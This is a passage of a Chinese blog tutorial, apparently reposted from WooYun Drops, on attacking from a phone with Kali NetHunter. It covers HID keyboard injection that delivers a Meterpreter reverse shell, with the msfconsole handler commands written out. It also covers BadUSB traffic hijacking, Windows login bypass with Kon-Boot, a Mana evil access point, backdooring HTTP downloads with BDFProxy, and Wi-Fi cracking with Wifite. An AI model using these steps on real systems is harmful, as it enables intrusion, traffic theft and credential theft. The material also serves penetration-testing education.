+<p>执行一堆ADB命令可以推送隐私文件等信息到指定目录,参考项目主页 <a href="https://github.com/photonicgeek/deADBolt" target="_blank" rel="external">https://github.com/photonicgeek/deADBolt</a></p>
+
+<p><strong>NFC Attack</strong></p>
+
+<p>提供了复制、重写、查看M卡数据功能(是不是不必带上Acr122u了;)</p>
+
+<p><strong>Settings</strong></p>
+
+<p>· 修改时区</p>
+
+<p>· 为Metasploit创建用户和数据库</p>
+
+<p>· 修改MAC地址</p>
+
+<p>· 安装NodeJS</p>
+
+<p><strong>Service</strong></p>
+
+<p>· SSH服务开关</p>
+
+<p>· VNC服务开关</p>
+
+<p>· OpenVPN服务开关</p>
+
+<p>· 在本地启动Xserver</p>
+
+<p><strong>Monitor Mode</strong></p>
+
+<p>启动或关闭wlan1(外置无线网卡)的混杂监听模式</p>
+
+<p><strong>Eject USB Wifi</strong></p>
+
+<p>弹出USB无线网卡</p>
+
+<h3>0x06 HID KeyBoard Attack</h3>
+
+<hr align="left" size="5" width="100%" noshade="noshade">
+
+<p>在过去,USB自启往往依赖插入的USB设备中的autorun.inf实现.时下这招往往不灵,而新兴的USB HID Attack则成为新的安全威胁.USB HID可通过模拟键盘或鼠标操作,实时执行目标代码,在此以PowerSploit结合MSF为例:</p>
+
+<p>首先运行提供payload的webserver,在Kali Service Control中开启Apache服务器</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00119.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[19]" border="0" alt="clip_image001[19]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00119_thumb.png" width="964" height="544"></a></p>
+
+<p>转到HID攻击配置页面,选择PowerSploit</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00219.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[19]" border="0" alt="clip_image002[19]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00219_thumb.png" width="964" height="544"></a></p>
+
+<p>IP和端口填写MSF监听的IP端口,Payload我们选择windows/meterpreter/reverse_https,URL为提供Apache服务的IP,这里即本机:192.168.1.151</p>
+
+<p>配置好后UPDATE配置文件,接下来需配置MSF监听反弹shell</p>
+
+<pre><code>root@kali:~# msfconsole -q</code></pre>
+
+<pre><code>msf &gt; use exploit/multi/handler</code></pre>
+
+<pre><code>msf exploit(handler) &gt;</code></pre>
+
+<p>payload同HID配置页面中的payload</p>
+
+<pre><code>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_https</code></pre>
+
+<pre><code>PAYLOAD =&gt; windows/meterpreter/reverse_https</code></pre>
+
+<p>IP和端口同样设置</p>
+
+<pre><code>msf exploit(handler) &gt; msf exploit(handler) &gt; set LHOST 192.168.0.17</code></pre>
+
+<pre><code>LHOST =&gt; 192.168.0.17</code></pre>
+
+<pre><code>msf exploit(handler) &gt; set LPORT 4444</code></pre>
+
+<pre><code>LPORT =&gt; 443</code></pre>
+
+<pre><code>msf exploit(handler) &gt; exploit</code></pre>
+
+<pre><code>&#160;</code></pre>
+
+<pre><code>[*] Started HTTPS reverse handler on https://0.0.0.0:4444/</code></pre>
+
+<pre><code>[*] Starting the payload handler...</code></pre>
+
+<p>至此配置OK</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00319.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003[19]" border="0" alt="clip_image003[19]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00319_thumb.png" width="964" height="544"></a></p>
+
+<p>开始监听</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00418.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[18]" border="0" alt="clip_image004[18]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00418_thumb.png" width="964" height="544"></a></p>
+
+<p>此时将设备连接至PC机,等待设备被识别后,执行Execute,攻击开始.</p>
+
+<p>POWERSHELL命令执行后,就可在msf中看到反弹的shell了:</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00515.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005[15]" border="0" alt="clip_image005[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00515_thumb.png" width="964" height="544"></a></p>
+
+<p>如连上PC后没有反应,可按Reset USB键更新.</p>
+
+<p>当然,HID KeyBoard Attack也提供了Windows CMD攻击模块,即连入计算机后自动打开CMD并执行指定命令(默认为添加新管理员用户,可自由定制).</p>
+
+<h3>0x07 BadUSB MITM Attack</h3>
+
+<hr align="left" size="5" width="100%" noshade="noshade">
+
+<p>BadUSB Attack是BlackHat大会上公布的一种较先进的USB攻击方式,模拟键盘操作等Payload可自动执行某些操作,而NetHunter的BadUSB MiTM Attack则是其中一种玩法:修改网络设定,劫持网络流量.</p>
+
+<p>关于BadUSB MITM Attack,NetHunter官网有演示视频,详见<a href="http://www.nethunter.com/showcase/" target="_blank" rel="external">http://www.nethunter.com/showcase/</a>,但并未交代详细过程,以下笔者操作为例:</p>
+
+<p>首先,确保手机连接目标计算机时,MTP文件传输是关闭的.连接目标计算机,打开手机USB网络共享:</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00615.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006[15]" border="0" alt="clip_image006[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00615_thumb.png" width="1924" height="1084"></a></p>
+
+<p>此时在NetHunter Home打开一个Kali Shell,查看网卡多出虚拟网卡rndis0(USB网络共享网卡).</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00715.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007[15]" border="0" alt="clip_image007[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00715_thumb.png" width="1924" height="1084"></a></p>
+
+<p>此时可以开启Tcpdump截获流量,命令如:</p>
+
+<pre><code>tcpdump -i rndis0</code></pre>
+
+<p>回到NetHunter Home,切换到BadUSB MiTM Attack,勾选右上角选项Start BadUSB Attack</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00815.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008[15]" border="0" alt="clip_image008[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00815_thumb.png" width="1924" height="1084"></a></p>
+
+<p>被连接的计算机此时会多出一个网卡,网关为rndis0的IP地址</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00913.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image009[13]" border="0" alt="clip_image009[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00913_thumb.png" width="1160" height="524"></a></p>
+
+<p>此时流量已可以截获,例如访问某些网站,手机tcpdump处流量显示如图:</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01013.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010[13]" border="0" alt="clip_image010[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01013_thumb.png" width="1924" height="1084"></a></p>
+
+<p>因为手机并未插入SIM卡,无网络,故PC机并无法得到返回页面.</p>
+
+<p>之前有同学在Drops分享的一片文章<a href="http://drops.wooyun.org/tools/3113" target="_blank" rel="external">Kali Nethunter初体验</a>中提到:</p>
+
+<p>出现双网关现在所以并未像官网演示的那样流量直接走向恶意网关（10.0.0.1）而是依旧走的之前的网关（192.168.1.1）故劫持失败</p>
+
+<p>这种情况也可能出现,不过个人测试中,网络连接优先级,默认劫持后的网关优先级更高,故流量可以正常劫持.也可能是NetHunter今年更新后做的优化,如图示:</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01111.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image011[11]" border="0" alt="clip_image011[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01111_thumb.png" width="1380" height="764"></a></p>
+
+<p>当然,配合HID Keyboard Attack进行攻击测试也是很好的方式,至于数据包的保存与分析,则可自行发挥.</p>
+
+<h3>0x08 绕过Windows登录认证</h3>
+
+<hr align="left" size="5" width="100%" noshade="noshade">
+
+<p>NetHunter其实有许多隐藏玩法,比如借助DriveDroid实现Windows登陆绕过密码.</p>
+
+<p>DriveDroid本是个允许通过安卓手机中的ISO/IMG镜像文件引导启动PC机的一个App,但结合了特定的镜像,实现绕过Windows登陆认证就变得可行:)</p>
+
+<p>在此以Win7为例,首先为默认账户创建密码hello.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01211.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012[11]" border="0" alt="clip_image012[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01211_thumb.png" width="748" height="393"></a></p>
+
+<p>DriveDroid默认引导镜像存放目录位于SDCard/Download/images,只需将欲引导的镜像存放于此目录即可.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01311.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image013[11]" border="0" alt="clip_image013[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01311_thumb.png" width="902" height="442"></a></p>
+
+<p>这里绕过Windows或OSX登陆认证的镜像为Kon-Boot.可以到官网了解,其原理在于处理BIOS修改系统内核的引导处理,跳过SAM检查,直接登陆系统.因为是付费软件,以下以自行寻觅的镜像为例演示.</p>
+
+<p>关闭MTP文件传输,打开DriveDroid,自动列出images目录下得镜像文件.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01410.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014[10]" border="0" alt="clip_image014[10]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01410_thumb.png" width="1084" height="1924"></a></p>
+
+<p>选择Kon-Boot.img镜像挂载,模式这里选择为Read-Only USB</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01510.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image015[10]" border="0" alt="clip_image015[10]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01510_thumb.png" width="1084" height="1924"></a></p>
+
+<p>加载成功后相应镜像有所标志</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01610.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image016[10]" border="0" alt="clip_image016[10]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01610_thumb.png" width="1084" height="1924"></a></p>
+
+<p>而在连入的PC机中也会显示加载有新的可移动磁盘(或软驱盘),如未能显示,可在配置页面进行相应调整(可通过USB Setup Wizard向导指引)</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0179.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image017[9]" border="0" alt="clip_image017[9]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0179_thumb.png" width="1084" height="1924"></a></p>
+
+<p>此时在设有密码的PC机重启,进入BIOS设置启动项</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image018.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image018" border="0" alt="clip_image018" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image018_thumb.jpg" width="3268" height="2452"></a></p>
+
+<p>如果镜像加载成功,可以看到飞奔的图案如下:</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image019.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image019" border="0" alt="clip_image019" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image019_thumb.jpg" width="3268" height="2452"></a></p>
+
+<p>之后登陆用户密码处回车即可绕过密码认证登陆系统</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image020.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image020" border="0" alt="clip_image020" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image020_thumb.jpg" width="3268" height="2452"></a></p>
+
+<p>需要说明的是,通过此方式登陆系统无法直接修改或删除系统密码.</p>
+
+<h3>0x09 WarDriving</h3>
+
+<hr align="left" size="5" width="100%" noshade="noshade">
+
+<p>犹记得当年前辈们肩扛笔记本做WarDriving的事迹,智能设备发展至今,WarDriving已可用便携设备取代.只是至今迟迟没有寻觅到比较合适直观的WarDriving工具,期待有朋友能开发或推荐个.</p>
+
+<p>在NetHunter下,Kali-Menu的Wireless模块中Kismet作为WarDriving的默认工具,不过操作起来画面太美不敢看:</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0217.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image021[7]" border="0" alt="clip_image021[7]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0217_thumb.png" width="1084" height="1924"></a></p>
+
+<p>退而求其次,推荐使用App WigleWifi.不过注</p>
+
+<p>意不要不小心上传数据.使用easy,界面很难看.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00121.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[21]" border="0" alt="clip_image001[21]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00121_thumb.png" width="1084" height="1924"></a></p>
+
+<p>好在数据可以以Sqlite数据库格式存储在本地.</p>
+
+<h3>0x10 Mana EvilAP蜜罐</h3>
+
+<hr align="left" size="5" width="100%" noshade="noshade">
+
+<p>想建个CMCC无线网络钓鱼劫持流量?PineApple没有带在身边,不妨拿出手机,开个蜜罐吧. :)</p>
+
+<p>Mana蜜罐采用与PineApple相同的:Hostapd的Karma补丁,可用来欺骗接入无线网络用户，使其可很平滑连接到虚假AP中，进行后续攻击.</p>
+
+<p>需要说明的是,NetHunter无线攻击模块,大都需要使用OTG外接USB无线网卡.主流芯片(可以试试Kali是否可直接识别)网卡均可.WN722N较为推荐,迷你的EDUP网卡通用性则较强(Raspberry Pi也可直接识别),只是信号强度..自然可想而知.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image002.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image002_thumb.jpg" width="3268" height="2452"></a></p>
+
+<p>Mana蜜罐有多种Hacking模式,均为sh脚本,可自由定制.Mana工具安装目录为:</p>
+
+<pre><code>/usr/share/mana-toolkit</code></pre>
+
+<p>启动脚本则在此处存放:</p>
+
+<pre><code>/usr/share/mana-toolkit/run-mana</code></pre>
+
+<p>截获流量文件存放于:</p>
+
+<pre><code>/var/lib/mana-toolkit</code></pre>
+
+<p>通过NetHunter Home的Mana蜜罐页面可方便的对配置文件进行修改:</p>
+
+<p>Hostapd配置文件</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00321.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003[21]" border="0" alt="clip_image003[21]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00321_thumb.png" width="1084" height="1924"></a></p>
+
+<p>DHCP服务配置文件</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00420.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[20]" border="0" alt="clip_image004[20]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00420_thumb.png" width="1084" height="1924"></a></p>
+
+<p>DNS欺骗配置文件</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00517.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005[17]" border="0" alt="clip_image005[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00517_thumb.png" width="1084" height="1924"></a></p>
+
+<p>服务启动脚本有多个,均可自由编辑修改:</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00617.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006[17]" border="0" alt="clip_image006[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00617_thumb.png" width="1084" height="1924"></a></p>
+
+<p>上图对应脚本start-nat-full.sh,脚本需要USB无线网卡(存在上行流量)启动,无线连入为NAT模式,并启动所有脚本包括:firelamb,sslstrip,sslsplit等,截获流量并保存.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00717.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007[17]" border="0" alt="clip_image007[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00717_thumb.png" width="1084" height="1924"></a></p>
+
+<p>start-nat-simple.sh同样有上行流量,但并不启动firelamb,sslstrip,sslsplit等脚本.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00817.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008[17]" border="0" alt="clip_image008[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00817_thumb.png" width="1084" height="1924"></a></p>
+
+<p>start-nat-simple-bdf.sh,加入了BDF恶意代码Inject工具,后面章节将对其攻击思路进行介绍.</p>
+
+<p>此外,还有</p>
+
+<p>start-noupstream.sh</p>
+
+<pre><code>Mana</code><code>作为无法上网的虚假</code><code>AP</code><code>启动</code><code>,</code><code>但可吸引</code><code>WIFI</code><code>默认开启的终端自动连接并抓取信息</code><code>.</code></pre>
+
+<p>start-noupstream-eap.sh</p>
+
+<pre><code>Mana</code><code>同样无法上网</code><code>,</code><code>但会进行</code><code>EAP</code><code>攻击</code><code></code></pre>
+
+<p>编辑好启动文件后,Start Attack,会弹窗勾选启动脚本:</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00915.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image009[15]" border="0" alt="clip_image009[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00915_thumb.png" width="1084" height="1924"></a></p>
+
+<p>即可启动服务.</p>
+
+<h3>0x11 Backdooring Executable Over HTTP</h3>
+
+<hr align="left" size="5" width="100%" noshade="noshade">
+
+<p>这个攻击思路就比较有趣了,新功能在NetHunter今年1月5号发布的版本中作为Kali Nethunter目前最新最酷炫的玩法,源于<a href="https://github.com/secretsquirrel/" target="_blank" rel="external">secret squirrel</a>的github项目<a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="external">the-backdoor-factory</a>和<a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="external">BDFProxy</a>,可让我们轻松地对使用HTTP协议传送的二进制文件注入shellcode.</p>
+
+<p>首先建立一个Mana蜜罐，SSID这里使用默认名称internet,启动服务</p>
+
+<pre><code>cd /usr/share/mana-toolkit/run-mana</code></pre>
+
+<pre><code>./start-nat-simple-bdf.sh</code></pre>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01015_3.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010[15]" border="0" alt="clip_image010[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01015_thumb.png" width="964" height="544"></a></p>
+
+<p>再开一个Shell,编辑bdfproxy.cfg,此配置文件包含了针对不同平台默认设置的payload,可自行更换.不过由于显示问题,用nano编辑文本会一行行刷新,还是换个方式编辑比较好.这里只把IP修改192.168.1.151,也可在Nethunter的主面板下的MANA Evil Access Point中进行配置.</p>
+
+<pre><code>nano /etc/bdfproxy/bdfproxy.cfg</code></pre>
+
+<p>配置好IP之后,在Shell中直接输入bdfproxy运行之.</p>
+
+<p>再新开一个Shell启动Metasploit</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01113.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image011[13]" border="0" alt="clip_image011[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01113_thumb.png" width="964" height="544"></a></p>
+
+<p>一切准备就绪,等待连入蜜罐AP的PC机上网下载二进制文件,在此通过百度下载everything(神器啊)演示:</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image012.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012" border="0" alt="clip_image012" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image012_thumb.jpg" width="854" height="452"></a></p>
+
+<p>运行everthing,因为注入了payload,会出现自校验失败的提示</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01313.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image013[13]" border="0" alt="clip_image013[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01313_thumb.png" width="964" height="604"></a></p>
+
+<p>查看MSF,已成功反弹回Shell了.而上面自校验失败的提示就是MeterPreter的screenshot帮我截取的 :)</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01412.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014[12]" border="0" alt="clip_image014[12]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01412_thumb.png" width="964" height="544"></a></p>
+
+<p>不得不说,这个新特性真的很Cool.</p>
+
+<h3>0x12 Wifite破解</h3>
+
+<hr align="left" size="5" width="100%" noshade="noshade">
+
+<p>写到最后,还没有提到无线破解是不科学的;) NetHunter推荐的Wifite破解工具是其最早集成的功能之一.移动设备的便携性更有利于随时随地进行Wifi安全测试,只需挂载上外置无线网卡便可轻松抓包破解.不过并不建议直接在移动设备上破解抓到的包,如跑几分钟没结果,就拿高性能设备破解吧,否则易导致设备死机.</p>
+
+<p>连接好外置无线网卡后,在Nethunter主菜单选择Launch Wifite即可进入</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image015.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image015" border="0" alt="clip_image015" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image015_thumb.jpg" width="3268" height="2452"></a></p>
+
+<p>选择开启混杂监听模式的网卡,选择Wlan1</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image016.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image016" border="0" alt="clip_image016" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image016_thumb.jpg" width="955" height="511"></a></p>
+
+<p>扫描开始,每5秒更新一次,当确认攻击目标后CTRL+C停止扫描</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01711.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image017[11]" border="0" alt="clip_image017[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01711_thumb.png" width="964" height="544"></a></p>
+
+<p>输入攻击目标序号,这里就选<code>XDSEC-WIFI</code>了,输入2</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0187.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image018[7]" border="0" alt="clip_image018[7]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0187_thumb.png" width="964" height="544"></a></p>
+
+<p>抓包成功后自动调用字典破解,这里机智的把字典删掉,其自动退出</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0197.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image019[7]" border="0" alt="clip_image019[7]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0197_thumb.png" width="964" height="544"></a></p>
+
+<p>抓到的握手包存放在/data/local/kali-armhf/HS目录下,命名规则是SSID+MAC</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0207.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image020[7]" border="0" alt="clip_image020[7]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0207_thumb.png" width="964" height="544"></a></p>
+
+<p>如果目标开启WPS,则自动进行PIN码破解.</p>
+
+<p>Wifite相对傻瓜化,易操作,适合移动终端.对无线网密码测试笔者也成功过几次,连入无线后结合zANTI等工具调戏即可:)</p>
+
+<h3>0x13 写在最后</h3>
+
+<hr align="left" size="5" width="100%" noshade="noshade">
+
+<p>文末,已将NetHunter大部分实战玩法进行相应介绍,文章为卷毛<a href="http://drops.wooyun.org/author/zing" target="_blank" rel="external">zing</a>同学与顺毛le4f同学共同编写,能力有限,如有不足之处望指出.抛砖引玉,期待有更多技巧分享.</p>
+
+<p>via <a title="http://drops.wooyun.org/tips/4634" href="http://drops.wooyun.org/tips/4634" target="_blank" rel="external">http://drops.wooyun.org/tips/4634</a></p>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://id.cker.in/1103.seo/" data-id="cirz1r8ue006ja376py23hyyh" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/Kali/">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/NetHunter/">NetHunter</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/WarDriving/">WarDriving</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/1104.seo/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          2014 新增热门软件排行榜 TOP 100(开源中国)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/1102.seo/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">How To Find User&#39;s SIDs with WMIC</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Kategorier</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/category/CPP-C-ASPNET-PHP-Js/">CPP-C#-ASPNET-PHP-Js</a></li><li class="category-list-item"><a class="category-list-link" href="/category/N900-IPhone-Android/">N900-IPhone-Android</a></li><li class="category-list-item"><a class="category-list-link" href="/category/Web安全/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/category/linux笔记/">linux笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/category/原创文章/">原创文章</a></li><li class="category-list-item"><a class="category-list-link" href="/category/影音娱乐/">影音娱乐</a></li><li class="category-list-item"><a class="category-list-link" href="/category/无线安全/">无线安全</a></li><li class="category-list-item"><a class="category-list-link" href="/category/渗透工具、攻防视频/">渗透工具、攻防视频</a></li><li class="category-list-item"><a class="category-list-link" href="/category/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/category/疑难杂症/">疑难杂症</a></li><li class="category-list-item"><a class="category-list-link" href="/category/精品软件/">精品软件</a></li><li class="category-list-item"><a class="category-list-link" href="/category/絮叨碎语/">絮叨碎语</a></li><li class="category-list-item"><a class="category-list-link" href="/category/黑客技巧/">黑客技巧</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
